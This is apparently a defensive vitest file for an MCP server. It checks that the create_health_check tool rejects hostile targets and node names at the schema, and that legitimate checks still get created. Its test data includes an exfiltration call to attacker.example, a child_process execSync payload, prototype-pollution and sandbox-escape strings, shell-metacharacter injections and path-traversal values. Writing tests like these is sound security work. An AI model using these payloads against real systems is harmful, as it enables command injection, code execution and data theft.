/**
 * #2534 — the MCP health surface must be no weaker than the HTTP one.
 *
 * `POST /api/health/checks` parses `target` with the shared `HealthCheckTarget`
 * and `nodeName` with `NodeName` (app/api/health/checks/route.ts). The MCP tool
 * `create_health_check` reaches the SAME sink — a `CheckConfig` row in
 * checks.json that `CheckRunner` later feeds to a probe — but declared both
 * fields as a bare `z.string()`, so a mutate-scope token could store a target
 * the web session could not send. `target` is not inert:
 *
 *   type: 'service' / 'systemd' → argv for `systemctl is-active <target>`
 *   type: 'podman'              → container id lookup
 *   type: 'http'                → a URL the box fetches
 *
 * These are attempted-injection tests through the MCP path specifically: they
 * drive the REAL MCP server over the in-memory transport and assert both that
 * the call is refused AND that `HealthStore.saveCheck` was never entered
 * (nothing reached the store, so nothing is ever scheduled). The positive cases
 * prove legitimate http/ping/container/service checks still create.
 *
 * #2535 closed the residual this file used to pin: there was also a
 * `type: 'script'` sink that interpolated the target into
 * `(async () => { <target> })()` and ran it with `vm.runInContext` on a context
 * holding the host realm's `fetch`. Target validation was parity with the REST
 * route, never containment, so the type was REMOVED rather than sandboxed. The
 * final describe block now asserts the removal instead of documenting the gap.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { HealthStore } from '@/lib/health/store';

// The safety layer reads `mcp.allowMutations` from the config; keep the rest of
// the module real.
vi.mock('@/lib/config', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/lib/config')>();
  return {
    ...actual,
    getConfig: vi.fn(async () => ({ mcp: { allowMutations: true } })),
  };
});

// Spy rather than `vi.mock` the whole store: HealthStore is shared by the
// diagnose/portal graph that `server.ts` also pulls in, and the assertion we
// need is only "the write sink was never entered".
let saveCheck: ReturnType<typeof vi.spyOn>;

beforeEach(() => {
  saveCheck = vi.spyOn(HealthStore, 'saveCheck').mockImplementation(() => {});
  vi.spyOn(HealthStore, 'getChecks').mockReturnValue([]);
});

afterEach(() => {
  vi.restoreAllMocks();
});

async function connectClient() {
  const { createMcpServer } = await import('./server');
  const server = createMcpServer();
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  const client = new Client({ name: 'test-client', version: '1.0.0' });
  await Promise.all([client.connect(clientTransport), server.connect(serverTransport)]);
  return { client };
}

/** Normalises the two shapes a rejection can take (a thrown McpError for a
 *  schema failure, or an `isError` result from the handler). */
async function callExpectingRejection(
  client: Client,
  name: string,
  args: Record<string, unknown>,
): Promise<{ rejected: boolean; message: string }> {
  try {
    const res = (await client.callTool({ name, arguments: args })) as {
      isError?: boolean;
      content?: Array<{ text?: string }>;
    };
    return {
      rejected: Boolean(res.isError),
      message: (res.content ?? []).map(c => c.text ?? '').join('\n'),
    };
  } catch (err) {
    return { rejected: true, message: err instanceof Error ? err.message : String(err) };
  }
}

/** JSON-RPC "Invalid params" — what the MCP SDK raises when the TOOL SCHEMA
 *  refuses the call, i.e. before the handler body runs at all. */
const INVALID_PARAMS = '-32602';

const noCheckStored = () => {
  expect(saveCheck, 'HealthStore.saveCheck must not be reached').not.toHaveBeenCalled();
};

// Payloads that reach a shell via the systemctl/podman probes. All are rejected
// by `HealthCheckTarget`. (The JS-shaped entries no longer have an evaluator to
// reach — #2535 removed it — but they stay: they are exactly the shapes the
// target class exists to refuse, whatever probe consumes the field next.)
const HOSTILE_TARGETS = [
  // JS-shaped payloads
  "fetch('http://attacker.example/exfil')",
  'process.mainModule.require("child_process").execSync("id")',
  'globalThis.constructor.constructor("return process")().exit(1)',
  'while(true){}',
  '({}).constructor.prototype.polluted = 1',
  // shell metacharacters
  'media; id',
  'media && id',
  'media | tee /tmp/pwned',
  'media$(id)',
  'media`id`',
  'media > /tmp/pwned',
  'media < /etc/passwd',
  "media'",
  'media"',
  'media\\x',
  'media\nid',
  'media\tid',
  // glob expansion
  'media*',
  'media?',
];

const HOSTILE_NODE_NAMES = [
  'local; id',
  'local && id',
  'local$(id)',
  'local`id`',
  '../../etc/passwd',
  'local node',
  'local/../other',
  'local|tee',
];

const baseArgs = { name: 'probe', type: 'service', interval: 60 };

describe('#2534 — MCP create_health_check rejects hostile targets at the tool schema', () => {
  for (const payload of HOSTILE_TARGETS) {
    it(`refuses target ${JSON.stringify(payload)}`, async () => {
      const { client } = await connectClient();
      const { rejected, message } = await callExpectingRejection(client, 'create_health_check', {
        ...baseArgs,
        target: payload,
      });
      expect(rejected, `create_health_check accepted ${JSON.stringify(payload)}`).toBe(true);
      expect(message.toLowerCase()).toMatch(/shell metacharacters|invalid arguments/);
      noCheckStored();
      await client.close();
    });
  }

  it('rejects at the tool schema, not in the handler', async () => {
    // The acceptance criterion is *where* the refusal happens: an
    // `Invalid params` JSON-RPC error means the SDK refused the call against
    // the declared schema, so no handler body — and therefore no probe
    // registration — ever ran.
    const { client } = await connectClient();
    const { rejected, message } = await callExpectingRejection(client, 'create_health_check', {
      ...baseArgs,
      target: 'media$(id)',
    });
    expect(rejected).toBe(true);
    expect(message).toContain(INVALID_PARAMS);
    expect(message).toContain('Invalid arguments for tool create_health_check');
    expect(message).toContain('target contains shell metacharacters');
    noCheckStored();
    await client.close();
  });

  it('rejects a hostile nodeName at the tool schema too', async () => {
    const { client } = await connectClient();
    const { rejected, message } = await callExpectingRejection(client, 'create_health_check', {
      ...baseArgs,
      target: 'media',
      nodeName: 'local$(id)',
    });
    expect(rejected).toBe(true);
    expect(message).toContain(INVALID_PARAMS);
    expect(message).toContain('invalid node name');
    noCheckStored();
    await client.close();
  });

  it('refuses an empty target', async () => {
    const { client } = await connectClient();
    const { rejected } = await callExpectingRejection(client, 'create_health_check', {
      ...baseArgs,
      target: '',
    });
    expect(rejected).toBe(true);
    noCheckStored();
    await client.close();
  });
});

describe('#2534 — MCP create_health_check validates nodeName with the shared NodeName schema', () => {
  for (const payload of HOSTILE_NODE_NAMES) {
    it(`refuses nodeName ${JSON.stringify(payload)}`, async () => {
      const { client } = await connectClient();
      const { rejected, message } = await callExpectingRejection(client, 'create_health_check', {
        ...baseArgs,
        target: 'media',
        nodeName: payload,
      });
      expect(rejected, `create_health_check accepted nodeName ${JSON.stringify(payload)}`).toBe(true);
      expect(message.toLowerCase()).toMatch(/invalid node name|invalid arguments/);
      noCheckStored();
      await client.close();
    });
  }
});

describe('#2534 — legitimate MCP health checks still create', () => {
  const LEGIT: Array<[string, string]> = [
    ['http', 'https://example.com/health'],
    ['http', 'http://192.168.1.10:8080/status'],
    ['ping', '192.168.1.1'],
    ['ping', 'nas.local'],
    ['podman', 'media-jellyfin'],
    ['service', 'media'],
    ['systemd', 'sb-agent@core.service'],
  ];

  for (const [type, target] of LEGIT) {
    it(`creates a ${type} check for ${target}`, async () => {
      const { client } = await connectClient();
      const res = (await client.callTool({
        name: 'create_health_check',
        arguments: { name: `probe ${type}`, type, target, interval: 60 },
      })) as { isError?: boolean };
      expect(res.isError).toBeFalsy();
      expect(saveCheck).toHaveBeenCalledWith(expect.objectContaining({ type, target }));
      await client.close();
    });
  }

  it('accepts an explicit nodeName and http expectations', async () => {
    const { client } = await connectClient();
    const res = (await client.callTool({
      name: 'create_health_check',
      arguments: {
        name: 'portal',
        type: 'http',
        target: 'https://example.com/health',
        interval: 30,
        nodeName: 'Local',
        httpExpectedStatus: 200,
        httpBodyMatch: 'ok',
      },
    })) as { isError?: boolean };
    expect(res.isError).toBeFalsy();
    expect(saveCheck).toHaveBeenCalledWith(
      expect.objectContaining({
        nodeName: 'Local',
        httpConfig: { expectedStatus: 200, bodyMatch: 'ok', bodyMatchType: 'contains' },
      }),
    );
    await client.close();
  });

  it('generates the check id server-side — a caller cannot supply one', async () => {
    // Relevant because HealthStore writes results to
    // `<DATA_DIR>/results/<check.id>.json`. On this tool the id is a
    // randomUUID(), so the caller never reaches that path segment. The REST
    // route DOES accept a caller-supplied id and is the weaker door there —
    // filed as #2536, not fixed here.
    const { client } = await connectClient();
    await client.callTool({
      name: 'create_health_check',
      arguments: { name: 'probe', type: 'ping', target: '10.0.0.1', interval: 60, id: '../../evil' },
    });
    expect(saveCheck).toHaveBeenCalledWith(
      expect.objectContaining({
        id: expect.stringMatching(/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/),
      }),
    );
    await client.close();
  });
});

describe('#2535 — the caller-supplied script check type is removed, not sandboxed', () => {
  // The predecessor of this block PINNED the residual: a metacharacter-free
  // target (`fetch.constructor.prototype.__proto__.polluted = 1`) sailed
  // through `HealthCheckTarget` and was stored, because the character class
  // removes JS *call* syntax but not member access, assignment or `await` —
  // and the vm context held the host realm's `fetch`. The exposure no longer
  // exists: the evaluator is deleted and `script` is off the accepted type set,
  // so the assertion is inverted from "accepted" to "refused, and nothing to
  // execute it with anyway".
  it('refuses type "script" at the tool schema and stores nothing', async () => {
    const { client } = await connectClient();
    const { rejected, message } = await callExpectingRejection(client, 'create_health_check', {
      name: 'residual',
      type: 'script',
      target: 'fetch.constructor.prototype.__proto__.polluted = 1',
      interval: 60,
    });
    expect(rejected, 'create_health_check accepted the removed "script" type').toBe(true);
    expect(message).toContain(INVALID_PARAMS);
    noCheckStored();
    await client.close();
  });

  // The other half of the removal — that no probe is left to dispatch a stored
  // `script` row to — is pinned in tests/backend/health_probe_registry.test.ts,
  // next to the registry it asserts about.
});
